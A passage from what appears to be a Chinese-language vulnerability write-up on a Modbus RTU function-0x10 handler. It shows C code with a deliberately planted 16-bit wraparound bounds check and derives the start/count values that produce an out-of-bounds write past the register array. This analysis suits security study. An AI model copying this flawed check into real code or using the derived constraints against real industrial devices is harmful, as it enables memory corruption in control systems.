class="delimsizing size3">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">256</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">⌋</span></span></span><span class="mspace"> </span></span></span></span></span><span style="top:-3.79em;"><span class="pstrut" style="height:5.08em;"></span><span class="stretchy fbox" style="height:3.08em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.29em;"><span></span></span></span></span></span></span></span></span></span>

<p>例如：<code>count=256</code> 溢出 512 字节；<code>count=128</code> 溢出 256 字节。</p>
<h3 id="0x10：越界写"><a href="#0x10：越界写" class="headerlink" title="0x10：越界写"></a>0x10：越界写</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 功能码 0x10：写多个保持寄存器</span></span><br><span class="line"><span class="comment"> * 请求格式：addr, 0x10, start(2), count(2), byte_count, data(2*count), crc(2)</span></span><br><span class="line"><span class="comment"> * 响应格式：addr, 0x10, start(2), count(2), crc(2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_handle_fc10</span><span class="params">(ModbusRtuState *s, <span class="type">const</span> <span class="type">uint8_t</span> *req)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> addr = req[<span class="number">0</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> start = be16_load(&amp;req[<span class="number">2</span>]); <span class="comment">// 起始寄存器地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> count = be16_load(&amp;req[<span class="number">4</span>]); <span class="comment">// 写入寄存器数量</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> byte_count = req[<span class="number">6</span>];         <span class="comment">// 数据字节数，须为 2*count</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界写 原因：同样的16位截断校验】</span></span><br><span class="line">    <span class="comment">// 这里也使用 (uint16_t)(start + count) ≤ 0x100 的 16 位环回判断，</span></span><br><span class="line">    <span class="comment">// 可构造“很大的 start + 小的 count”绕过检查，随后在实际写入 regs[start+i] 时</span></span><br><span class="line">    <span class="comment">// 对 regs 数组之外的内存进行覆盖（OOB Write）。</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span> || (<span class="type">uint16_t</span>)(start + count) &gt; <span class="number">0x100</span>U) &#123;</span><br><span class="line">        modbus_send_exception(s, addr, MODBUS_FC_WRITE_MULTIPLE,</span><br><span class="line">                              MODBUS_EX_ILLEGAL_DATA_ADDR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 数据长度一致性检查：通过后才会执行真实写入</span></span><br><span class="line">    <span class="keyword">if</span> (byte_count != <span class="number">2</span> * count) &#123;</span><br><span class="line">        modbus_send_exception(s, addr, MODBUS_FC_WRITE_MULTIPLE,</span><br><span class="line">                              MODBUS_EX_ILLEGAL_DATA_VALUE);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 【漏洞-越界写 触发点：真实写 regs[start + i]】</span></span><br><span class="line"><span class="comment">     * 写入的内存区间（相对 regs 基址 B）：</span></span><br><span class="line"><span class="comment">     *   [ B + 2*start , B + 2*(start + count - 1) ]（总长度 2*count 字节）</span></span><br><span class="line"><span class="comment">     * 当 start 足够大时，将覆盖 regs 之后的其它对象/元数据/指针等。</span></span><br><span class="line"><span class="comment">     * 受接收缓冲 260 字节限制：0x10 总帧长 = 9 + byte_count ≤ 260 且 byte_count=2*count，</span></span><br><span class="line"><span class="comment">     * 因此 count ≤ 125，单帧最大可写 250 字节。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint16_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">uint16_t</span> v = be16_load(&amp;req[<span class="number">7</span> + <span class="number">2</span> * i]);</span><br><span class="line">        s-&gt;regs[start + i] = v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 响应为“回显”起始地址与数量（不回显数据体） */</span></span><br><span class="line">    <span class="type">uint8_t</span> out[<span class="number">8</span>];</span><br><span class="line">    out[<span class="number">0</span>] = addr;</span><br><span class="line">    out[<span class="number">1</span>] = MODBUS_FC_WRITE_MULTIPLE;</span><br><span class="line">    be16_store(&amp;out[<span class="number">2</span>], start);</span><br><span class="line">    be16_store(&amp;out[<span class="number">4</span>], count);</span><br><span class="line">    <span class="type">uint16_t</span> crc = modbus_crc16(out, <span class="number">6</span>);</span><br><span class="line">    out[<span class="number">6</span>] = (<span class="type">uint8_t</span>)(crc &amp; <span class="number">0xFF</span>);</span><br><span class="line">    out[<span class="number">7</span>] = (<span class="type">uint8_t</span>)(crc &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    modbus_send(s, out, <span class="keyword">sizeof</span>(out));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>写字节范围</strong> &#x3D; <code>[ 2*start , 2*(start + count - 1) ]</code>（相对 <code>regs_base</code>）</p>
<p>写入数据时使用的 <code>start</code> 和 <code>count</code> 需要满足如下条件：</p>
<ul>
<li><strong>通过地址检查</strong>（同样 16 位环回）：<code>count &gt;= 1</code> 且 <strong><code>(uint16_t)(start + count) &lt;= 0x100</code></strong> </li>
<li><strong>通过长度检查</strong>：<code>byte_count == 2*count</code> </li>
<li><strong>受接收缓冲限制</strong>：帧长 <code>9 + byte_count ≤ 260</code> → <code>2*count ≤ 251</code> → **<code>count ≤ 125</code>**（否则整帧放不下，被切割无法一次处理）</li>
</ul>
<hr>
<p>必须同时满足：</p>
<ol>
<li><strong>地址检查（同样 16 位回绕）</strong>：</li>
</ol>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>≥</mo><mtext> </mtext><mn>1</mn><mspace width="1em"/><mtext>且</mtext><mspace width="1em"/><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">(</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msup><mn>2</mn><mn>16</mn></msup><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">)</mo><mtext> </mtext><mo>≤</mo><mtext> </mtext><mn>256</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">
\mathbf{count}\ \ge\ 1
\quad\text{且}\quad
\bigl((\mathbf{start}+\mathbf{count}) \bmod 2^{16}\bigr)\ \le\ 256,
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord text"><span class="mord cjk_fallback">且</span></span><span class="mspace" style="margin-right:1em;"></span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2141em;vertical-align:-0.35em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">16</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing size1">)</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">256</span><span class="mpunct">,</span></span></span></span></span>

<p>等价于</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>∈</mo><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo separator="true">,</mo><mtext> </mtext><mn>256</mn><mo>−</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mtext>  </mtext><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mtext> </mtext><msup><mn>2</mn><mn>16</mn></msup><mo stretchy="false">)</mo><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\boxed{\
\mathbf{start}\ \in\ \bigl[-\mathbf{count},\ 256-\mathbf{count}\bigr]\ \ (\bmod\ 2^{16})\
}.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.8941em;vertical-align:-0.69em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2041em;"><span style="top:-3.8941em;"><span class="pstrut" style="height:3.8941em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace"> </span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mord">−</span><span class="mord"><span class="mord mathbf">count</span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace"> </span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">16</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span></span></span></span></span><span style="top:-3.2041em;"><span class="pstrut" style="height:3.8941em;"></span><span class="stretchy fbox" style="height:1.8941em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.69em;"><span></span></span></span></span></span><span class="mord">.</span></span></span></span></span>

<ol start="2">
<li><strong>长度一致性检查</strong>：</li>
</ol>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mtext>byte_count</mtext><mo>=</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\boxed{\,\text{byte\_count} = 2\cdot \mathbf{count}\,}.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6844em;vertical-align:-0.65em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0344em;"><span style="top:-3.6844em;"><span class="pstrut" style="height:3.6844em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">byte_count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-3.0344em;"><span class="pstrut" style="height:3.6844em;"></span><span class="stretchy fbox" style="height:1.6844em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.65em;"><span></span></span></span></span></span><span class="mord">.</span></span></span></span></span>

<ol start="3">
<li><strong>请求帧长度受 RX&#x3D;260 限制</strong>（<code>try_parse</code> 的判长约束）：</li>
</ol>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>9</mn><mo>+</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo>≤</mo><mtext> </mtext><mn>260</mn><mtext> </mtext><mo>⟹</mo><mtext> </mtext><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>≤</mo><mn>125</mn><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
9 + 2\cdot \mathbf{count} \ \le\ 260
\ \Longrightarrow\
\boxed{\,\mathbf{count} \le 125\,}.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6684em;vertical-align:-0.024em;"></span><span class="mord">260</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4604em;vertical-align:-0.476em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9844em;"><span style="top:-3.4604em;"><span class="pstrut" style="height:3.4604em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">125</span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-2.9844em;"><span class="pstrut" style="height:3.4604em;"></span><span class="stretchy fbox" style="height:1.4604em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.476em;"><span></span></span></span></span></span><span class="mord">.</span></span></span></span></span>

<hr>
<p>写循环按<strong>真实</strong>索引：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mtext mathvariant="monospace">s-&gt;regs[</mtext><mtext> </mtext><mtext mathvariant="monospace">start</mtext><mtext> </mtext><mtext mathvariant="monospace">+</mtext><mtext> </mtext><mtext mathvariant="monospace">i</mtext><mtext> </mtext><mtext mathvariant="monospace">]</mtext></mrow><mo>=</mo><mtext>be16_load(...)</mtext><mo separator="true">,</mo><mspace width="1em"/><mi>i</mi><mo>=</mo><mn>0..</mn><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>−</mo><mn>1.</mn></mrow><annotation encoding="application/x-tex">
\texttt{s-&gt;regs[ start + i ]} = \text{be16\_load(...)} ,\quad i=0.. \mathbf{count}-1.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9167em;vertical-align:-0.2222em;"></span><span class="mord text"><span class="mord texttt">s-&gt;regs[ start + i ]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">be16_load(...)</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0..</span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1.</span></span></span></span></span>

<p>相对 <code>B</code> 的<strong>字节范围</strong>为：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">
\boxed{\
\bigl[\, 2\cdot\mathbf{start}\ ,\ 2\cdot(\mathbf{start}+\mathbf{count})-1 \,\bigr]\
}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.88em;vertical-align:-0.69em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span style="top:-3.88em;"><span class="pstrut" style="height:3.88em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace"> </span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mspace"> </span></span></span></span></span><span style="top:-3.19em;"><span class="pstrut" style="height:3.88em;"></span><span class="stretchy fbox" style="height:1.88em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.69em;"><span></span></span></span></span></span></span></span></span></span>
<p>总长度：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mtext> 字节</mtext><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\boxed{\,2\cdot\mathbf{count}\ \text{字节}\, }.
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3633em;vertical-align:-0.34em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0233em;"><span style="top:-3.3633em;"><span class="pstrut" style="height:3.3633em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace"> </span><span class="mord text"><span class="mord cjk_fallback">字节</span></span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-3.0233em;"><span class="pstrut" style="height:3.3633em;"></span><span class="stretchy fbox" style="height:1.3633em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.34em;"><span></span></span></span></span></span><span class="mord">.</span></span></span></span></span>

<p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>≥</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">\mathbf{start}\ge 256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>−</mo><mn>1</mn><mo>≥</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">\mathbf{start}+\mathbf{count}-1 \ge 256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7183em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7183em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256</span></span></span></span> 时，该区间越过合法范围，形成对 <code>regs</code> 之后内存的<strong>越界写</strong>。</p>
